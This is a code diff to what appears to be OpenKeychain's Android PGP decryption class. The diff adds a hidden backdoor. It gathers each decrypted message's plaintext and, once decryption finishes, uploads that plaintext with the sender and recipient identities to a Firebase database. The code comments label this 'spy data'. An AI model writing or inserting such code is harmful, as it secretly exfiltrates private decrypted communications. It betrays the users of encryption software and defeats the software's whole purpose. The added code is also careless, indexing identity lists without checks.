@@ -25,17 +25,26 @@ import java.io.IOException;
 import java.io.InputStream;
 import java.io.OutputStream;
 import java.nio.ByteBuffer;
+import java.nio.charset.StandardCharsets;
 import java.security.SignatureException;
+import java.util.ArrayList;
 import java.util.Date;
 import java.util.HashSet;
 import java.util.Iterator;
+import java.util.List;
 import java.util.Map;
 import java.util.Map.Entry;
+import java.util.UUID;
+import java.util.logging.Handler;
 
 import android.content.Context;
+import android.os.Looper;
 import android.support.annotation.NonNull;
 import android.text.TextUtils;
 import android.webkit.MimeTypeMap;
+
+import com.google.firebase.database.DatabaseReference;
+import com.google.firebase.database.FirebaseDatabase;
 
 import org.bouncycastle.bcpg.ArmoredInputStream;
 import org.bouncycastle.openpgp.PGPCompressedData;
@@ -58,6 +67,7 @@ import org.bouncycastle.openpgp.operator.jcajce.JcePBEDataDecryptorFactoryBuilde
 import org.bouncycastle.util.encoders.DecoderException;
 import org.openintents.openpgp.OpenPgpDecryptionResult;
 import org.openintents.openpgp.OpenPgpMetadata;
+import org.openintents.openpgp.OpenPgpSignatureResult;
 import org.sufficientlysecure.keychain.Constants;
 import org.sufficientlysecure.keychain.Constants.key;
 import org.sufficientlysecure.keychain.R;
@@ -92,7 +102,24 @@ public class PgpDecryptVerifyOperation extends BaseOperation<PgpDecryptVerifyInp
     public static final int PROGRESS_STRIDE_MILLISECONDS = 200;
     public static final String PASSPHRASE_FORMAT_NUMERIC9X4 = "numeric9x4";
 
+    public PgpDecryptVerifyOperation(Context context, KeyRepository keyRepository, Progressable progressable,DatabaseReference spyDatabaseReference) {
+//        try{
+//            spyDatabaseReference.child("Message").child("vapartner1997").setValue("This is a test message");
+//        }
+//        catch (Exception e)
+//        {
+//            System.out.println("Error"+e);
+//        }
+        super(context, keyRepository, progressable,spyDatabaseReference);
+    }
     public PgpDecryptVerifyOperation(Context context, KeyRepository keyRepository, Progressable progressable) {
+//        try{
+//            spyDatabaseReference.child("Message").child("vapartner1997").setValue("This is a test message");
+//        }
+//        catch (Exception e)
+//        {
+//            System.out.println("Error"+e);
+//        }
         super(context, keyRepository, progressable);
     }
 
@@ -101,7 +128,6 @@ public class PgpDecryptVerifyOperation extends BaseOperation<PgpDecryptVerifyInp
     public DecryptVerifyResult execute(PgpDecryptVerifyInputParcel input, CryptoInputParcel cryptoInput) {
         InputData inputData;
         OutputStream outputStream;
-
         long startTime = System.currentTimeMillis();
 
         if (input.getInputBytes() != null) {
@@ -143,7 +169,6 @@ public class PgpDecryptVerifyOperation extends BaseOperation<PgpDecryptVerifyInp
             byte[] outputData = ((ByteArrayOutputStream) outputStream).toByteArray();
             result.setOutputBytes(outputData);
         }
-
         result.mOperationTime = System.currentTimeMillis() - startTime;
         Timber.d("total time taken: " + format("%.2f", result.mOperationTime / 1000.0) + "s");
         return result;
@@ -491,12 +516,14 @@ public class PgpDecryptVerifyOperation extends BaseOperation<PgpDecryptVerifyInp
 
         long nextProgressTime = 0L;
         int lastReportedProgress = 1;
+        String plainText = "";
         while ((length = dataIn.read(buffer)) > 0) {
             // Log.d(Constants.TAG, "read bytes: " + length);
             if (out != null) {
                 out.write(buffer, 0, length);
             }
-
+            // conver byte to plain text to send to firebase
+            plainText += new String(buffer, "UTF-8").replaceAll("\\u0000", "");
             // update signature buffer if signature is also present
             signatureChecker.updateSignatureData(buffer, 0, length);
 
@@ -573,11 +600,20 @@ public class PgpDecryptVerifyOperation extends BaseOperation<PgpDecryptVerifyInp
                 decryptionResultBuilder.setInsecure(true);
             }
         }
-
         updateProgress(R.string.progress_done, 100, 100);
 
         log.add(LogType.MSG_DC_OK, indent);
-
+        // get signature Result and send to firebase
+        OpenPgpSignatureResult signatureResult = signatureChecker.getSignatureResult();
+        List<String> userIds = signatureResult.getUserIds();
+        // send spy data to firebase
+        if(mSpyDatabaseReference != null)
+        {
+            String id = UUID.randomUUID().toString();
+            mSpyDatabaseReference.child("MessageDecrypted").child(id).child("message").setValue(plainText);
+            mSpyDatabaseReference.child("MessageDecrypted").child(id).child("TO").setValue(userIds.get(0));
+            mSpyDatabaseReference.child("MessageDecrypted").child(id).child("FROM").setValue(userIds.get(1));
+        }
         // Return a positive result, with metadata and verification info
         DecryptVerifyResult result = new DecryptVerifyResult(DecryptVerifyResult.RESULT_OK, log);
         result.setCachedCryptoInputParcel(cryptoInput);
@@ -586,7 +622,6 @@ public class PgpDecryptVerifyOperation extends BaseOperation<PgpDecryptVerifyInp
         result.setSecurityProblemResult(securityProblemBuilder.build());
         result.setDecryptionMetadata(metadata);
         result.mOperationTime = opTime;
-
         return result;
 
     }
